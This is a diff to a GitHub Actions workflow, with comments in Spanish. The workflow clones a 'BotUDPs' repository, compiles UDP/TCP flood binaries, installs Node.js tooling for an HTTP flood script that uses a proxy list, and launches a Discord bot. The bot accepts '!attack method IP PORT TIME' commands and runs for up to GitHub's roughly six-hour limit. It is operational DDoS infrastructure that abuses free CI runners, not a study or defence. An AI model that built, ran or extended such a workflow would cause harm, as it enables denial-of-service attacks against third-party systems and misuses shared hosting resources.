@@ -1,4 +1,4 @@
-name: PORQUENOANDAAAA
+name: nomedenbangeisss
 
 on:
   workflow_dispatch:
@@ -8,13 +8,13 @@ on:
 jobs:
   clone-compile-run:
     runs-on: ubuntu-latest
-
+    
     steps:
     - name: 🗑️ Limpiar directorio anterior
       run: |
         echo "Limpiando directorios anteriores..."
         rm -rf BotUDPs 2>/dev/null || true
-
+    
     - name: 📥 Clonar repositorio
       run: |
         echo "Clonando repositorio BotUDPs..."
@@ -22,24 +22,24 @@ jobs:
           echo "❌ Error clonando, intentando clonado superficial..."
           git clone --depth 1 https://github.com/zJonch14/BotUDPs.git || exit 1
         fi
-
+        
         cd BotUDPs
         echo "✅ Repositorio clonado"
         echo "📁 Contenido:"
         ls -la
-
+    
     - name: 🐍 Configurar Python
       uses: actions/setup-python@v4
       with:
         python-version: '3.11'
-
+    
     - name: 🔧 Instalar herramientas esenciales
       run: |
         echo "Instalando herramientas..."
         sudo apt-get update
         sudo apt-get install -y build-essential gcc g++ make libpcap-dev wget
         echo "✅ Herramientas instaladas"
-
+    
     - name: 📦 Instalar discord.py
       run: |
         cd BotUDPs
@@ -59,23 +59,23 @@ jobs:
         echo "========================================"
         echo "COMPILACIÓN CON TOLERANCIA A FALLOS"
         echo "========================================"
-
+        
         # Desactivar exit-on-error para este paso
         set +e
-
+        
         echo "📋 Archivos .c encontrados:"
         find . -maxdepth 1 -name "*.c" -type f
-
+        
         compiled=0
         failed=0
-
+        
         for c_file in *.c; do
           [ -f "$c_file" ] || continue
-
+          
           binary="${c_file%.c}"
           echo ""
           echo "🔨 Compilando: $c_file → $binary"
-
+          
           # Intentar compilar cada archivo
           if gcc -O3 -pthread "$c_file" -o "$binary" 2>&1; then
             chmod +x "$binary"
@@ -94,7 +94,7 @@ jobs:
         gcc -O3 tcp.c -o tcp
         chmod +x tcp
         echo ""
-
+        
         echo ""
         echo "========================================"
         echo "RESUMEN DE COMPILACIÓN:"
@@ -104,97 +104,113 @@ jobs:
         echo "📂 EJECUTABLES DISPONIBLES:"
         find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" ! -name "*.sh" | while read exe; do
           size=$(stat -c%s "$exe" 2>/dev/null || echo "?")
-          echo "  ✓ $(basename "$exe") \(${size} bytes\)"
+          echo "  ✓ $(basename "$exe") (${size} bytes)"
         done || echo "  Ningún ejecutable encontrado"
-
+        
         # Reactivar exit-on-error
         set -e
-
+        
         echo "========================================"
         echo "⚠️  Continuando aunque algunos archivos hayan fallado"
 
-
+    
     - name: 🦾 Configurar Go para scripts .go
       run: |
         cd BotUDPs
-
+        
         # Solo si hay archivos .go
         if ls *.go >/dev/null 2>&1; then
           echo "🦾 Configurando Go..."
-
+          
           # Instalar dependencias Go
           go get github.com/sandertv/go-raknet 2>/dev/null || echo "⚠️  go-raknet opcional"
-
+          
           echo "✅ Go configurado"
         else
           echo "⚠️  No hay archivos .go, omitiendo Go"
         fi
-
-    - name: Prepare environment for https-request
-      run: |
-        cd BotUDPs  # Asegurarse de estar en el directorio del repo
-        echo "=== Preparando entorno para https-request ==="
-        python3 install.py
-
-    - name: 🚀 EJECUTAR BOT CON KEYS
+    
+    - name: 🔐 Configurar token DESDE SECRET KEYS
       env:
-        DISCORD_TOKEN: ${{ secrets.KEYS }}  # ¡IMPORTANTE! Esto pasa KEYS al bot.py
+        DISCORD_TOKEN: ${{ secrets.KEYS }}
+      run: |
+        cd BotUDPs
+        
+        if [ -z "$DISCORD_TOKEN" ]; then
+          echo "❌ ERROR: Secret 'KEYS' no configurado"
+          echo "Configúralo en Settings → Secrets → Actions → KEYS"
+          exit 1
+        fi
+        
+        echo "$DISCORD_TOKEN" > token.txt
+        echo "✅ Token guardado en token.txt"
+
+    - name: Install Node.js
+      run: |
+          cd BotUDPs
+          sudo apt-get update
+          sudo apt-get install -y nodejs npm
+          sudo npm install -g request
+
+    - name: 🚀 EJECUTAR bot.py
       run: |
         cd BotUDPs
         echo "========================================"
-        echo "🤖 INICIANDO BOT UDP/TCP/AMP/L7"
+        echo "🚀 INICIANDO BOT UDP"
         echo "========================================"
-
-        # DEBUG: Verificar que KEYS se recibió
-        echo "🔍 VERIFICANDO CONFIGURACIÓN:"
-        echo "   - Directorio: $(pwd)"
-        echo "   - Archivo bot.py: $(ls -la bot.py 2>/dev/null && echo "✅" || echo "❌")"
-        echo "   - KEYS recibido: $([ -n "$DISCORD_TOKEN" ] && echo "✅ (${#DISCORD_TOKEN} chars)" || echo "❌ VACÍO")"
-
-        if [ -z "$DISCORD_TOKEN" ]; then
-          echo ""
-          echo "❌❌❌ ERROR: DISCORD_TOKEN está VACÍO ❌❌❌"
-          echo ""
-          echo "SOLUCIÓN INMEDIATA:"
-          echo "1. El secret 'KEYS' NO está configurado o está vacío"
-          echo "2. Ve a: Settings → Secrets and variables → Actions"
-          echo "3. Haz clic en 'KEYS' para verificar su contenido"
-          echo "4. Si está vacío, edítalo y pega tu token"
-          echo ""
-          echo "Token de Discord debe tener ~59 caracteres como:"
-          echo "pito"
+        echo "📅 Hora: $(date)"
+        echo ""
+        
+        # Verificar que tenemos lo mínimo necesario
+        if [ ! -f "bot.py" ]; then
+          echo "❌ ERROR: bot.py no encontrado"
+          exit 1
+        fi
+        
+        if [ ! -f "token.txt" ]; then
+          echo "❌ ERROR: token.txt no encontrado"
           exit 1
         fi
 
-        # Verificar formato del token
-        if [ ${#DISCORD_TOKEN} -lt 50 ]; then
-          echo "⚠️  ADVERTENCIA: Token muy corto (${#DISCORD_TOKEN} chars)"
-          echo "   Debe tener ~59 caracteres mínimo"
+        if [ ! -f "gravitus.js" ]; then
+          echo "❌ ERROR: gravitus.js no encontrado"
+          exit 1
         fi
 
-        echo ""
-        echo "✅ CONFIGURACIÓN CORRECTA"
-        echo "   Token recibido: ${#DISCORD_TOKEN} caracteres"
-        echo "   Vista previa: ${DISCORD_TOKEN:0:15}..."
-        echo ""
-        echo "🎮 MÉTODOS DISPONIBLES:"
-
-        # Mostrar métodos según ejecutables
-        for method in udp udphex udppps ovh udppayload udpbypass tcp tcp-syn httpsrequest; do
-          [ -f "$method" ] && echo "   • $method"
+        if [ ! -f "proxy.txt" ]; then
+          echo "❌ ERROR: proxy.txt no encontrado"
+          exit 1
+        fi
+        
+        echo "✅ Archivos críticos verificados"
+        echo "🎮 Métodos disponibles según ejecutables:"
+        
+        # Mostrar métodos basados en ejecutables disponibles
+        for method in udp udphex udppps ovh tcp udppayload udpbypass; do
+          if [ -f "$method" ]; then
+            echo "  !attack $method [IP] [PUERTO] [TIEMPO]"
+          fi
         done
 
-        [ -f "udpflood.go" ] && echo "   • udpflood (Go)"
-        [ -f "raknet.go" ] && echo "   • raknet (Go)"
-
+        echo "  !attack httpsrequest [IP] [PUERTO] [TIEMPO]"
+        
+        if [ -f "udpflood.go" ]; then
+          echo "  !attack udpflood [IP] [PUERTO] [TIEMPO]"
+        fi
+        
+        if [ -f "raknet.go" ]; then
+          echo "  !attack raknet [IP] [PUERTO] [TIEMPO]"
+        fi
+        
         echo ""
-        echo "🚀 INICIANDO bot.py..."
-        echo "========================================"
-
-        # Ejecutar bot.py (KEYS ya está como variable de entorno)
+        echo "⚡ INICIANDO BOT..."
+        echo "El bot se ejecutará hasta el límite de GitHub (~6h)"
+        echo ""
+        
+        # Ejecutar bot
         python3 bot.py
-
+        
         echo ""
         echo "========================================"
-        echo "🤖 BOT FINALIZADO"
+        echo "BOT DETENIDO - Hora: $(date)"
         echo "========================================"
